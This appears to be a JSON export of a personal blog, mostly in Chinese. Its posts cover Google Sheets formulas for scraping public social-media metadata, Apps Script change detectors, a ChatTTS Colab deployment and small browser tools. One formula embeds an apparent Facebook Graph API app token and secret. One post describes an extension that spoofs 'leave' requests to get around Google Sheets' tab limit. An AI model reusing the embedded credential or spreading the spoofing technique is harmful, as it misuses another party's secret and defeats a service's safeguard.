the preset prompt content. After entering, click confirm. Click the &quot;Edit&quot; button to remove unwanted prompts. Once set up, click any prompt in the list on the right to preset it in the input field below, eliminating the need for manual input. The list supports drag-and-drop sorting, allowing you to adjust the order to your preference. ","tags":[{"index":-1,"name":"AI 科技","slug":"ai-tech","used":true,"link":"https://dev-coco.github.io/tag/ai-tech/"}],"title":"Prompt Menu User Guide","feature":"https://dev-coco.github.io/post-images/Prompt-Menu-EN.png","link":"https://dev-coco.github.io/post/Prompt-Menu-EN/","stats":{"text":"2 min read","time":104000,"words":278,"minutes":2},"date":"2024-08-08 06:08:22","dateFormat":"2024-08-08"},{"content":"Prompt Menu Chrome Extension’s privacy policy is detailed here. Data Collection and Usage Our Chrome Extension, &quot;Prompt Menu&quot; does not collect, store, or process any personal data from its users. It operates with no user accounts, backend services, or data collection mechanisms. No Tracking We do not track users' activities, do not use analytics, and do not employ cookies or similar technologies within the Chrome Extension. Data Sharing As we do not collect any data, there is nothing to share with third parties. Security Our Extension is designed with your privacy in mind, and although it collects no data, we are committed to ensuring the security of our Chrome Extension. ","tags":[{"index":-1,"name":"AI 科技","slug":"ai-tech","used":true,"link":"https://dev-coco.github.io/tag/ai-tech/"}],"title":"Prompt Menu Privacy Policy","feature":"https://dev-coco.github.io/post-images/Prompt-Menu-Privacy-Policy-EN.png","link":"https://dev-coco.github.io/post/Prompt-Menu-Privacy-Policy-EN/","stats":{"text":"1 min read","time":42000,"words":113,"minutes":1},"date":"2024-08-08 05:45:53","dateFormat":"2024-08-08"},{"content":"压缩率高达 80% - 90%。 工具链接: 视频压缩工具 这是一个纯前端实现的视频压缩功能。所有数据都在本地执行，不会上传到服务器，安全可靠。 使用方法 拖入一个视频，或者选择一个文件，然后点击「压缩视频」按钮。 耐心等待压缩完成，压缩速度取决于设备的性能。 常规压缩后，原始文件 7.97 MB，压缩后 1.29 MB，压缩率 83.76%。 开启极限压缩后，可以获得更高的压缩率。原始文件 7.97 MB 压缩后 553.52 KB，压缩率 93.22% 经过测试，一般的视频文件可以达到 80% - 90% 左右的压缩率。不同格式的视频效果可能会有不同。 ","tags":[{"index":-1,"name":"其它","slug":"other","used":true,"link":"https://dev-coco.github.io/tag/other/"}],"title":"视频压缩工具","feature":"https://dev-coco.github.io/post-images/Video-Compression.png","link":"https://dev-coco.github.io/post/Video-Compression/","stats":{"text":"1 min read","time":43000,"words":199,"minutes":1},"date":"2024-08-03 01:12:56","dateFormat":"2024-08-03"},{"content":"收集了一些常用网址做成了一个带有分类的导航页。 导航页链接：https://dev-coco.github.io/Navigation/ 在页面的中间有一个聚合搜索器。选择需要搜索的平台，输入关键词，点击右侧的搜索图标即可打开搜索页面。 网站侧边栏按照网站类型创建了菜单，可以根据类型找到相应的网站。 请注意，部分网址背景标记为粉色。这些可能是大陆站点或由大陆开发的站点。如果介意，请勿使用。 如果这个导航页对你有所帮助，可以快捷找到需要的网站，不妨将这个页面加入书签，更方便的打开导航页面。 ","tags":[{"index":-1,"name":"其它","slug":"other","used":true,"link":"https://dev-coco.github.io/tag/other/"}],"title":"导航页介绍","feature":"https://dev-coco.github.io/post-images/Navigation-Page.png","link":"https://dev-coco.github.io/post/Navigation-Page/","stats":{"text":"1 min read","time":39000,"words":192,"minutes":1},"date":"2024-07-10 08:14:33","dateFormat":"2024-07-10"},{"content":"无需购买服务器即可免费在线托管 ChatTTS。 ChatTTS 是专门为对话场景设计的文本转语音模型。 Colab 是一项托管的 Jupyter Notebook 服务。 部署项目 首先，需要有一个 Google 账号，然后新建一个 Colab 项目。 然后把下面的代码粘贴到项目中，点击「运行」按钮。 !git clone -q https://github.com/6drf21e/ChatTTS_colab %cd ChatTTS_colab !git clone -q https://github.com/2noise/ChatTTS %cd ChatTTS !git checkout -q f4c8329 %cd .. !mv ChatTTS abc !mv abc/ChatTTS ./ChatTTS !pip install -q omegaconf vocos vector_quantize_pytorch gradio cn2an pypinyin openai jieba !python webui_mix.py --share 需要一会时间等待部署完成。当显示出下图内容的时候就代表部署完成了，打开 public URL 就可以使用了。 功能介绍 音色抽卡 使用测试文本和随机 seed 生成音频，选择适用的音频并且记录 seed 参数。这个功能的作用是挑选适合的音色，然后下次再通过文字转语音的时候使用相同的 seed 生成出一样的音色，但也有可能会存在一些差异。 测试文本建议简短一点，因为只是听音色，所以内容简短生成的速度会越快。seed 生成数量可以自定义，一批生成多个音频。 生成出音频后，在右侧可以点击播放键播放音频，也可以点击保存种子。 长音频生成 在左侧「朗读文本」中放入需要生成的文本。在文本中允许使用 prompt。在右侧可以自定义各种参数。 下面是参数介绍： 语速 (speed)：数值越大，速度越快。 口语化 (oral)：数值越大，添加的“就是”、“那么”之类的连接词越多。 笑声 (laugh)：控制文本是否添加笑声，数值越大，笑声越多。 停顿 (break)：控制文本是否添加停顿，数值越大，停顿越多。 温度 (temperate)：控制音频情感波动，数值越大，波动性越大。 top_P：控制音频情感相关性，数值越大，相关性越高。 top_K：控制音频情感相似性，数值越大，相似性越高。 ","tags":[{"index":-1,"name":"AI 科技","slug":"ai-tech","used":true,"link":"https://dev-coco.github.io/tag/ai-tech/"}],"title":"部署 ChatTTS 到 Google Colab","feature":"https://dev-coco.github.io/post-images/Deploy-ChatTTS-Colab.png","link":"https://dev-coco.github.io/post/Deploy-ChatTTS-Colab/","stats":{"text":"2 min read","time":118000,"words":531,"minutes":2},"date":"2024-06-08 01:10:31","dateFormat":"2024-06-08"},{"content":"使用 Google 脚本检测指定范围的内容是否被修改。 在多人协助编辑表格的时候，很容易造成内容被误删或者被修改，所以可以通过 Google 脚本来检测指定范围的内容是否被修改。 在表格内 A1:C1 范围是表头，需要检测这个范围的内容是否被修改。 因为在表格内的数据是一个二维数组，可以通过 Google 脚本 Log 小技巧 这个方法把内容打印在文档里。 const sheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName('工作表1') const title = sheet.getRange('A1:C1').getValues() logToDoc('SheetID', title) 然后获取表格内的标题内容和设置好的原始内容判断是否一致，为了方便判断，这里把数组使用 toString 改成文本格式后再进行判断。 const title = sheet.getRange('A1:C1').getValues() const origTitle = [[&quot;日期&quot;,&quot;名字&quot;,&quot;数量&quot;]] if (title.toString() !== origTitle.toString()) { SpreadsheetApp.getUi().alert('内容被篡改') } 如果需要还原回原始内容，使用 setValues 写入原始内容。 sheet.getRange('A1:C1').setValues(origTitle) 完整代码如下： function detectSheet () { const sheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName('工作表1') const title = sheet.getRange('A1:C1').getValues() const origTitle = [[&quot;日期&quot;,&quot;名字&quot;,&quot;数量&quot;]] if (title.toString() !== origTitle.toString()) { SpreadsheetApp.getUi().alert('内容被篡改') // 还原内容 // sheet.getRange('A1:C1').setValues(origTitle) } } ","tags":[{"name":"Google 脚本","slug":"google-script","used":true,"link":"https://dev-coco.github.io/tag/google-script/"}],"title":"Google 脚本检测内容修改","feature":"https://dev-coco.github.io/post-images/Google-Script-Content-Modify.jpg","link":"https://dev-coco.github.io/post/Google-Script-Content-Modify/","stats":{"text":"2 min read","time":81000,"words":330,"minutes":2},"date":"2024-02-27 05:29:14","dateFormat":"2024-02-27"},{"content":"使用 Google Script 检测表格的名称是否被修改。 使用 IMPORTRANGE 函数从其它的表格引用数据的时候，如果表格名字被修改了就会导致函数引用范围出错，那么就可以使用 Google 脚本检测表格名称是否被修改，及时的发现问题。 建立一个清单，设置好表格 ID 和当前的表格名称。 const verifyList = { 0: '工作表1', 1650832426: '工作表4' } 然后使用 getSheetId 获取表格 ID，从 verifyList 清单里面获取原始的表格名称。 const sheetName = verifyList[sheet.getSheetId()] 再使用 getSheetName 获取当前的表格名称和原始的表格名称判断是否一致。 if (sheet.getSheetName() !== sheetName) { // 表格名字被修改 } 完整代码如下： const verifyList = { 0: '工作表1', 1650832426: '工作表4' } function detectSheet () { const ss = SpreadsheetApp.getActiveSpreadsheet().getSheets() for (const sheet of ss) { const sheetName = verifyList[sheet.getSheetId()] if (sheetName &amp;&amp; sheet.getSheetName() !== sheetName) { Logger.log(sheetName) SpreadsheetApp.getUi().alert('表格名字被修改') return } } } ","tags":[{"name":"Google 脚本","slug":"google-script","used":true,"link":"https://dev-coco.github.io/tag/google-script/"}],"title":"Google 脚本检测表格名称修改","feature":"https://dev-coco.github.io/post-images/Google-Script-Detect-Sheet-Name-Modify.jpg","link":"https://dev-coco.github.io/post/Google-Script-Detect-Sheet-Name-Modify/","stats":{"text":"1 min read","time":58000,"words":240,"minutes":1},"date":"2024-02-21 00:05:49","dateFormat":"2024-02-21"},{"content":"使用谷歌表格中的 IMPORTXML 函数从社交媒体获取数据并且导入表格。 在下面函数的例子中 A1 是引用单元格对应的链接。 Facebook Facebook 小组 小组名称 =IMPORTXML(A1, &quot;//title&quot;) 小组横幅图 =IMAGE(IMPORTXML(A1, &quot;//meta[@property='og:image']/@content&quot;)) 小组简介如果太长会显示不完整。 =IMPORTXML(A1, &quot;//meta[@name='description']/@content&quot;) 小组 ID =REGEXREPLACE(IMPORTXML(A1, &quot;//meta[@property='al:android:url']/@content&quot;), &quot;[^\\d]&quot;, &quot;&quot;) Facebook 专页/时间线 专页/时间线名称 =IMPORTXML(A1, &quot;//title&quot;) 专页/时间线头像 =IMAGE(IMPORTXML(A1, &quot;//meta[@property='og:image']/@content&quot;)) 专页/时间线头像（仅限 ID） =IMAGE(&quot;https://graph.facebook.com/&quot;&amp;A1&amp;&quot;/picture?width=9999&amp;access_token=2712477385668128|b429aeb53369951d411e1cae8e810640&quot;) 专页点赞数和简介 =LAMBDA(desc, { REGEXREPLACE(REGEXREPLACE(desc, &quot; likes ·.+&quot;, &quot;&quot;), &quot;.+\\. &quot;, &quot;&quot;), REGEXREPLACE(desc, &quot;.+talking about this. |.+were here. &quot;, &quot;&quot;) })(SUBSTITUTE(IMPORTXML(A1, &quot;//meta[@name='description']/@content&quot;), CHAR(10), &quot;&quot;)) 专页/时间线 ID =REGEXREPLACE(IMPORTXML(A1, &quot;//meta[@property='al:android:url']/@content&quot;), &quot;[^\\d]&quot;, &quot;&quot;) Facebook 帖子 帖子内容 =IMPORTXML(A1, &quot;//meta[@name='description']/@content&quot;) 帖子图片 =IMAGE(IMPORTXML(A1, &quot;//meta[@property='og:image']/@content&quot;)) 帖子 ID =REGEXREPLACE(REGEXREPLACE(IMPORTXML(A1, &quot;//meta[@property='og:url']/@content&quot;), &quot;.+\\D\\/|\\/$&quot;, &quot;&quot;), &quot;.+\\/&quot;, &quot;&quot;) 获取小组帖子的发帖账号 ID、发帖日期和发帖时间。 注意，如果是正在审核中的帖子，将不会显示任何内容。 =LAMBDA( info, IF( REGEXMATCH( info, &quot;dateCreated&quot; ), {REGEXREPLACE( REGEXEXTRACT( info, &quot;identifier....*?:&quot; ), &quot;\\D&quot;, &quot;&quot; ), SPLIT( REGEXREPLACE( REGEXREPLACE( info, &quot;\\n&quot;, &quot;&quot; ), &quot;.*?},.dateCreated...|.{5}&quot;&quot;.+&quot;, &quot;&quot; ), &quot;T&quot; )}, &quot;&quot; ) )(REGEXREPLACE( IMPORTXML( SUBSTITUTE( A1, &quot;pending_&quot;, &quot;&quot; ), &quot;//script[1]/text()&quot; ), &quot;\\n&quot;, &quot;&quot; )) Instagram Instagram 主页 主页名称 =REGEXREPLACE(IMPORTXML(A1, &quot;//title&quot;), &quot;..@.+&quot;, &quot;&quot;) 主页粉丝数、关注数、帖子数 =LAMBDA(desc, { LAMBDA(follower, IFERROR(SWITCH(REGEXEXTRACT(follower, &quot;K|M&quot;), &quot;K&quot;, REGEXREPLACE(follower, &quot;\\D&quot;,&quot;&quot;) * 1000, &quot;M&quot;, REGEXREPLACE(follower, &quot;\\D&quot;,&quot;&quot;) * 1000000), follower) )(REGEXREPLACE(desc, &quot; Followers.+&quot;, &quot;&quot;)), REGEXREPLACE(desc, &quot;.+Followers, | Following.+&quot;, &quot;&quot;), REGEXREPLACE(desc, &quot;.+, | Posts.+&quot;, &quot;&quot;) })(SUBSTITUTE(IMPORTXML(A1, &quot;//meta[@name='description']/@content&quot;), CHAR(10), &quot;&quot;)) Instagram 帖子 帖子 ID =REGEXREPLACE(IMPORTXML(A1, &quot;//meta[@property='al:ios:url']/@content&quot;), &quot;[^\\d]&quot;, &quot;&quot;) 帖子缩略图 =IMAGE(IMPORTXML(A1, &quot;//meta[@property='og:image']/@content&quot;)) 点赞数、评论数、帖子发布日期、帖子内容 =LAMBDA(desc, { LAMBDA(likes, IFERROR(SWITCH(REGEXEXTRACT(likes, &quot;K|M&quot;), &quot;K&quot;, REGEXREPLACE(likes, &quot;\\D&quot;,&quot;&quot;) * 1000, &quot;M&quot;, REGEXREPLACE(likes, &quot;\\D&quot;,&quot;&quot;) * 1000000), likes) )(REGEXREPLACE(desc, &quot; likes.+&quot;, &quot;&quot;)), LAMBDA(comments, IFERROR(SWITCH(REGEXEXTRACT(comments, &quot;K|M&quot;), &quot;K&quot;, REGEXREPLACE(comments, &quot;\\D&quot;,&quot;&quot;) * 1000, &quot;M&quot;, REGEXREPLACE(comments, &quot;\\D&quot;,&quot;&quot;) * 1000000), comments) )(REGEXREPLACE(desc, &quot;.+likes, | comments.+&quot;, &quot;&quot;)), REGEXREPLACE(desc, &quot;.*?on |:.+&quot;, &quot;&quot;), REGEXREPLACE(desc, &quot;.*?: &quot;&quot;|&quot;&quot;$&quot;, &quot;&quot;) })(SUBSTITUTE(IMPORTXML(A1, &quot;//meta[@name='description']/@content&quot;), CHAR(10), &quot;&quot;)) Instagram 标签 标签帖子数量 =LAMBDA(desc, IFERROR(SWITCH(REGEXEXTRACT(desc, &quot;K|M&quot;), &quot;K&quot;, REGEXREPLACE(desc, &quot;\\D&quot;,&quot;&quot;) * 1000, &quot;M&quot;, REGEXREPLACE(desc, &quot;\\D&quot;,&quot;&quot;) * 1000000), desc) )(REGEXREPLACE(A1, &quot; posts.+&quot;, &quot;&quot;)) Tiktok Tiktok 主页 主页关注数 =IMPORTXML(A1, &quot;//strong[@data-e2e='following-count']&quot;) 主页点赞数、粉丝数、简介 =LAMBDA(json, { REGEXREPLACE(json, &quot;\\n|.+LikeAction&quot;&quot;},&quot;&quot;userInteractionCount&quot;&quot;:|}.+&quot;, &quot;&quot;), REGEXREPLACE(json, &quot;\\n|.+FollowAction&quot;&quot;},&quot;&quot;userInteractionCount&quot;&quot;:|}.+&quot;, &quot;&quot;), SUBSTITUTE(REGEXREPLACE(json, &quot;\\n|.+description&quot;&quot;:&quot;&quot;|&quot;&quot;,&quot;&quot;alternateName.+&quot;, &quot;&quot;), &quot;\\n&quot;, CHAR(10)) })(SUBSTITUTE(IMPORTXML(A1, &quot;//*[@id='Person']&quot;), CHAR(10), &quot;&quot;)) Tiktok 帖子 帖子点赞数 =IMPORTXML(A1, &quot;//strong[@data-e2e='like-count']&quot;) 帖子评论数 =IMPORTXML(A1, &quot;//strong[@data-e2e='comment-count']&quot;) 帖子收藏数 =IMPORTXML(A1, &quot;//strong[@data-e2e='undefined-count']&quot;) 帖子分享数 =IMPORTXML(A1, &quot;//strong[@data-e2e='share-count']&quot;) 帖子描述 =REGEXEXTRACT(SUBSTITUTE(IMPORTXML(A1, &quot;//meta[@name='description']/@content&quot;), CHAR(10), &quot;&quot;), &quot;“.*?”&quot;) 帖子使用的背景音乐 =INDEX(IMPORTXML(A1, &quot;//div[@class='tiktok-pvx3oa-DivMusicText epjbyn3']&quot;), 1) 帖子发帖时间 =IMPORTXML(A1, &quot;//span[@data-e2e='browser-nickname']/span[3]&quot;) WhatsApp 群组名称 =INDEX(IMPORTXML(A1, &quot;//h3&quot;), 2) 群组头像 =IMAGE(INDEX(IMPORTXML(A1, &quot;//img/@src&quot;), 3)) Telegram Telegram 小组 小组名称 =IMPORTXML(A1, &quot;//div[@class='tgme_page_title']&quot;) 小组成员数 =REGEXREPLACE(IMPORTXML(A1, &quot;//div[@class='tgme_page_extra']&quot;), &quot;members.+|\\D&quot;, &quot;&quot;) 小组简介 =JOIN(CHAR(10), IMPORTXML(A1, &quot;//div[@class='tgme_page_description']&quot;)) 小组头像 =IMAGE(IMPORTXML(A1, &quot;//meta[@property='og:image']/@content&quot;)) Telegram 频道 频道名称 =IMPORTXML(A1, &quot;//div[@class='tgme_channel_info_header_title']&quot;) 频道头像 =IMAGE(IMPORTXML(A1, &quot;//a[@class='tgme_header_link']//img//@src&quot;)) 频道关注数、图片数、链接数 =TRANSPOSE(IMPORTXML(A1, &quot;//span[@class='counter_value']&quot;)) 频道描述 =JOIN(CHAR(10), IMPORTXML(A1, &quot;//div[@class='tgme_channel_info_description']&quot;)) 频道近期帖文链接 =IMPORTXML(A1, &quot;//div[@data-post]/@data-post&quot;) YouTube 频道名称 =IMPORTXML(A1, &quot;//meta[@name='twitter:title']/@content&quot;) 频道头像 =IMAGE(IMPORTXML(A1, &quot;//meta[@property='og:image']/@content&quot;)) 频道简介 =IMPORTXML(A1, &quot;//meta[@property='og:description']/@content&quot;) 视频缩略图 =IMAGE(&quot;https://img.youtube.com/vi/&quot;&amp;REGEXREPLACE(A1, &quot;.+\\.be\\/|.+shorts\\/|.+\\.com\\/watch\\?v=|\\?.+&quot;, &quot;&quot;)&amp;&quot;/maxresdefault.jpg&quot;) YouTube 的缩略图有 4 种分辨率，分别是：maxresdefault、hqdefault、sddefault、mqdefault。 Pinterest 主页粉丝数和关注数 =LAMBDA(info, LAMBDA(fans, follower, { IFERROR(SWITCH(REGEXEXTRACT(fans, &quot;k|M&quot;), &quot;k&quot;, REGEXREPLACE(fans, &quot;\\D&quot;,&quot;&quot;) * 1000, &quot;M&quot;, REGEXREPLACE(fans, &quot;\\D&quot;,&quot;&quot;) * 1000000), fans), IFERROR(SWITCH(REGEXEXTRACT(follower, &quot;k|M&quot;), &quot;k&quot;, REGEXREPLACE(follower, &quot;\\D&quot;,&quot;&quot;) * 1000, &quot;M&quot;, REGEXREPLACE(follower, &quot;\\D&quot;,&quot;&quot;) * 1000000), follower) }) (INDEX(info, 1, 1), INDEX(info, 2, 1)) )(IMPORTXML(A1, &quot;//div[@class='tBJ dyH iFc sAJ O2T zDA IZT H2s']&quot;)) 主页简介 =SUBSTITUTE(IMPORTXML(A1, &quot;//span[@class='tBJ dyH iFc sAJ O2T zDA IZT swG']&quot;), CHAR(10), &quot;&quot;) Reddit Reddit 主页 主页帖子和评论 Karma 分数 =TRANSPOSE(IMPORTXML(A1, &quot;//span[@data-testid='karma-number']&quot;)) 注册时间 =REGEXREPLACE(IMPORTXML(A1, &quot;//time[@data-testid='cake-day']/@datetime&quot;), &quot;T.+&quot;, &quot;&quot;) Reddit 帖子 帖子标题 =TRIM(JOIN(&quot;&quot;, IMPORTXML(A1, &quot;//h1[@slot='title']&quot;))) 帖子内容 =TRIM(JOIN(&quot;&quot;, IMPORTXML(A1, &quot;//div[@data-post-click-location='text-body']&quot;))) 相关推荐： Google Excel WhatsApp 相关 Excel 一点通 ","tags":[{"name":"Excel","slug":"excel","used":true,"link":"https://dev-coco.github.io/tag/excel/"}],"title":"Google Excel 使用函数导入社交媒体数据","feature":"https://dev-coco.github.io/post-images/Google-Excel-Import-Social-Media.jpg","link":"https://dev-coco.github.io/post/Google-Excel-Import-Social-Media/","stats":{"text":"8 min read","time":452000,"words":1398,"minutes":8},"date":"2024-02-16 12:18:05","dateFormat":"2024-02-16"},{"content":"使用 Google 脚本检测是否在原来的基础上增加了或删除了表格。 在多人协作使用表格的时候，使用函数在不同的分表计算数据，有时候新增了表格没有及时更新函数就会导致新增的表格的数据被漏掉统计，或者有时候删除了表格就会导致原来写好的函数引用范围出错，显示 #REF!。 首先，使用 getSheets 获取电子表格内的所有表格。 const sheets = SpreadsheetApp.getActiveSpreadsheet().getSheets() 然后再通过 sheet.length 获取表格的总数。 完整代码例子如下： function detectSheet () { const sheets = SpreadsheetApp.getActiveSpreadsheet().getSheets() Logger.log(sheets.length) if (sheets.length &gt; 2) { SpreadsheetApp.getUi().alert('增加了表格') } else if (sheets.length &lt; 2) { SpreadsheetApp.getUi().alert('删除了表格') } } 这里设置的表格数量是 2，需要预先设置好表格原有的数量，然后每次运行的时候都会检测表格是增加了还是删减了。 ","tags":[{"name":"Google 脚本","slug":"google-script","used":true,"link":"https://dev-coco.github.io/tag/google-script/"}],"title":"Google 脚本检测表格增加或删除","feature":"https://dev-coco.github.io/post-images/Google-Script-Detect-Addition-Deletion.jpg","link":"https://dev-coco.github.io/post/Google-Script-Detect-Addition-Deletion/","stats":{"text":"1 min read","time":55000,"words":245,"minutes":1},"date":"2024-02-14 09:24:31","dateFormat":"2024-02-14"},{"content":"使用 Google 脚本检测表格行和列的长度是否超出指定范围。 有时候会遇到这种情况，在表格内会出现上千列或者行，然而这些多出来的范围是没有使用的，而且会造成表格卡顿。 首先使用 getValues 获取表格中列的数量。 const lastColumn = sheet.getRange('1:1').getValues()[0].length 这里解释一下为什么不使用 getLastColumn 获取列的数量，而是要使用 getValues。 因为 getLastColumn 只能获取单元格内有内容的最后一列的数量，如果单元格内没有任何内容就会被忽略掉。那么使用 getValues 就可以确保获取完整的列的数量，即使单元格内没有任何内容。 然后判断列的数量是否超过指定的数量，如果超过了就通过 deleteColumns 删除。 if (lastColumn &gt; 20) { sheet.deleteColumns(20, lastColumn - 20) } 完整代码例子如下： const verifyList = [0, 1344777394] function detectSheet () { const ss = SpreadsheetApp.getActiveSpreadsheet().getSheets() for (const sheet of ss) { if (verifyList.includes(sheet.getSheetId())) { // 删除列 const lastColumn = sheet.getRange('1:1').getValues()[0].length if (lastColumn &gt; 20) sheet.deleteColumns(20, lastColumn - 20) // 删除行 const lastRow = sheet.getRange('A:A').getValues().length if (lastRow &gt; 100) sheet.deleteRows(100, lastRow - 100) } } } 在 verifyList 数组中设置指定表格的 ID，也就是表格链接 gid=xxxxx 上的数字，这样只会在指定的表格运行此功能。 在下面这一行代码中可以设置删除列的数量，例子中代码的意思是删除超过第 20 列的范围。 if (lastColumn &gt; 20) sheet.deleteColumns(20, lastColumn - 20) 如果要删除超过第 10 列的范围，那么就改成下面的代码，3 个参数都需要一起修改。 if (lastColumn &gt; 10) sheet.deleteColumns(10, lastColumn - 10) 删除行的设置范围同理，就不演示了。 最后再设置一个定时器，在打开表格的时候运行这个函数，这样每次打开表格的时候都会自动检测表格的行和列，如果超出指定范围就会自动删除掉。 ","tags":[{"name":"Google 脚本","slug":"google-script","used":true,"link":"https://dev-coco.github.io/tag/google-script/"}],"title":"Google 脚本检测表格行和列的长度","feature":"https://dev-coco.github.io/post-images/Google-Script-Detect-Row-Column.jpg","link":"https://dev-coco.github.io/post/Google-Script-Detect-Row-Column/","stats":{"text":"2 min read","time":119000,"words":505,"minutes":2},"date":"2024-02-11 02:52:04","dateFormat":"2024-02-11"},{"content":"解决超过 100 人同时编辑电子表格的限制。 插件下载：Chrome 插件合集 使用方法 点击插件，输入指定的表格链接，再点击「添加」，支持添加多个表格。 添加成功后会显示表格 ID，这样就设置完了，没有任何提示或特殊的显示，打开表格就会自动生效。 注意事项 此插件的功能仅限于在出现提示「目前有过多用户在编辑此文件，因此部分工具可能无法使用。」的情况下使用，正常情况下不需要使用此插件。 相关推荐：Google Excel 多人编辑表格出现错误 由于这个限制的原因是打开的分页过多导致的，所以需要每一个访问表格的用户的浏览器都需要安装此插件，并且设置好才可以解决这个问题，如果只是部分用户使用可能效果不明显。 原理分析 多人打开表格的时候，右上角会显示匿名的查看者。分析一下网络请求， 看一下是根据哪些请求识别的新查看者。 从这里可以看出加载完表格的页面后，第一个请求的是 sync 路径，然后表格就新增了查看者。 当离开表格后，会请求 leave 路径，然后表格就减少了一个查看者。 由此可以得出请求 sync 是增加查看者，请求 leave 的时候就减少了查看着。那么只需要监听请求路径，在检测到 sync 请求时再发起 leave 请求，让系统认为用户已经“离开”了表格。这样即使打开了 100 个分页，也依然可以正常编辑。 实测效果如下： ","tags":[{"name":"Excel","slug":"excel","used":true,"link":"https://dev-coco.github.io/tag/excel/"}],"title":"修复电子表格分页限制","feature":"https://dev-coco.github.io/post-images/Spreadsheet-Tabs-Limit-Fix.jpg","link":"https://dev-coco.github.io/post/Spreadsheet-Tabs-Limit-Fix/","stats":{"text":"2 min read","time":93000,"words":456,"minutes":2},"date":"2024-02-05 07:05:18","dateFormat":"2024-02-05"},{"content":"根据列表中一列表格链接和一列引用范围使用 IMPORTRANGE 引用数据并且数组输出。 例如表格内 A 列是表格链接，B 列是引用范围。 那么常规的方法一般会使用 {}（大括号），把内容合并为数组输出。 ={ IMPORTRANGE(A1, B1); IMPORTRANGE(A2, B2) } 虽然也可以实现这个效果，但是引用的范围是静态的，当列表中增加或者删减需要引用的表格链接和范围，那么就需要手动更改函数。 解决方法 =WRAPROWS( TOROW(MAP( A1:A2, B1:B2, LAMBDA( ssUrl, ssRange, TOROW( IFERROR(IMPORTRANGE(ssUrl, ssRange)) ) ) )) , 5) 原理分析 这里使用了 LAMBDA 和 MAP 组合函数，把引用的 A 列和 B 列在 LAMBDA 函数中分别自定义 ssUrl 和 ssRange 变量，这两个变量分别对应表格链接和引用范围。然后再把这两个变量的值传入 IMPORTRANGE 函数中。 =MAP(A1:A2, B1:B2, LAMBDA(ssUrl, ssRange, IMPORTRANGE(ssUrl, ssRange))) 但是直接这么使用的话函数会出错，因为 LAMBDA 函数只支持单行输出，而 IMPORTRANGE 引用的数据是一整个范围的。 所以需要把 IMPORTRANGE 引用的数据转换成行。这里用到 TOROW 函数，作用是将一个数组或者一个范围的数据转换成单行。 =MAP(A1:A2, B1:B2, LAMBDA(ssUrl, ssRange, TOROW(IMPORTRANGE(ssUrl, ssRange)))) 因为列表中 A 列的表格链接有两个，虽然刚才把 IMPORTRANGE 输出的结果转换成单行了，但是有两个链接，所以会输出两行的数据，需要再次使用 TOROW 函数把所有数据都转换成单行。 =TOROW(MAP(A1:A2, B1:B2, LAMBDA(ssUrl, ssRange, TOROW(IMPORTRANGE(ssUrl, ssRange))))) 现在已经把所有的数据都引用过来了，需要把数据的格式还原。这里用到 WRAPROWS 函数，将数据按照指定的列数拆分并且换行。 在列表中 B 列引用的范围是 A 到 E 列，这个范围一共有 5 列，那么在 WRAPROWS 函数中第二个参数需要设置 5，意思是每 5 列将数据换行。 =WRAPROWS(TOROW(MAP(A1:A2, B1:B2, LAMBDA(ssUrl, ssRange, TOROW(IMPORTRANGE(ssUrl, ssRange))))), 5) 这样就实现了 IMPORTRANGE 数组输出，只需要在列表中 A 列和 B 列修改表格链接和引用范围就可以自动根据这些范围引用内容。 如果想去掉引用数据的空行，可以使用 QUERY 函数筛选非空行，例子如下。 =QUERY( WRAPROWS( TOROW(MAP( A1:A2, B1:B2, LAMBDA( ssUrl, ssRange, TOROW(IMPORTRANGE(ssUrl, ssRange))) ) ) , 5) , &quot;select * where Col1 is not null&quot;) 相关推荐： Google Excel 性能优化 - 跨表引用 Google Excel 动态获取表格名称 ","tags":[{"name":"Excel","slug":"excel","used":true,"link":"https://dev-coco.github.io/tag/excel/"}],"title":"Google Excel IMPORTRANGE 数组输出","feature":"https://dev-coco.github.io/post-images/Google-Excel-Array-Importrange.jpg","link":"https://dev-coco.github.io/post/Google-Excel-Array-Importrange/","stats":{"text":"3 min read","time":155000,"words":663,"minutes":3},"date":"2024-02-04 05:17:50","dateFormat":"2024-02-04"},{"content":"针对「目前有过多用户在编辑此文件，因此部分工具可能无法使用。」问题的解决方法。 错误提示 在打开表格的时候出现「目前有过多用户在编辑此文件，因此部分工具可能无法使用。」提示，并且表格变成网页模式预览，无法使用工具栏的功能，也无法编辑表格内容，只能查看内容。 这是正常的表格链接。 https://docs.google.com/spreadsheets/d/xxxxxxx/edit#gid=xxx 出现错误，变成网页模式预览后表格链接会变成下面的这种格式，链接中包含 htmlview 参数。 https://docs.google.com/spreadsheets/d/xxxxxxx/htmlview?pli=1#gid=xxx 原因 官方说明 如果有同时或者超过 100 个标签页打开此表格，会造成这种情况，有部分用户就无法正常编辑表格。 这里有一个很重要的因素：标签页。 这里指的不是使用人数，而是标签页。那么可以设想一下，如果有 20 个人同时编辑表格，每个人只要同时在 5 个标签页打开表格就已经达到了 100 个标签页的上限，那么会造成有部分用户无法正常编辑的这种情况。所以这个问题和使用的人数没有关系，也和表格里面存放的数据量多少没有关系，而是和这个表格打开标签页的数量有关系。 下面是一个新建的表格，没有任何内容，打开 100 个标签页后出现错误提示的演示。 解决方案 如果只是临时出现这种问题，并不会很频繁的复现，那么只需要把链接中 htmlview 以及后面的参数都删掉，再重新打开表格就可以恢复正常。 等待一小会，等部分用户关闭表格，开启的总标签页没有那么多的时候再尝试打开表格。 如果使用人数没有达到 100 个用户，那么在条件允许的情况下，每个人只打开 1 个标签页使用，就不会达到上限。 如果尝试了以上的方法依然出现这种问题，建议创建多个电子表格分开使用，一部分用户使用表格 A，另外一部分用户使用表格 B，假设有 100 个用户分成两个表格使用，那么每个表格各 50 个用户使用，即使有部分用户打开多个分页，一般情况下也是足够使用的。 修复电子表格分页限制 相关推荐： Google Excel 表格保护和区域保护 ","tags":[{"name":"Excel","slug":"excel","used":true,"link":"https://dev-coco.github.io/tag/excel/"}],"title":"Google Excel 多人编辑表格出现错误","feature":"https://dev-coco.github.io/post-images/Google-Excel-Multi-Editor-Error.jpg","link":"https://dev-coco.github.io/post/Google-Excel-Multi-Editor-Error/","stats":{"text":"3 min read","time":142000,"words":682,"minutes":3},"date":"2024-01-29 11:37:02","dateFormat":"2024-01-29"},{"content":"给表格设置保护权限，或者指定区域设置保护，防止多人编辑的时候数据被修改。 表格保护 对着表格名字点击右键，选择「保护工作表」。 然后在右侧会显示选项界面，默认是整个表格所有内容都设置保护权限，如果需要排除指定的范围可编辑，勾选「特定单元格除外」，选择好后点击「设置权限」。 修改此范围时显示警告 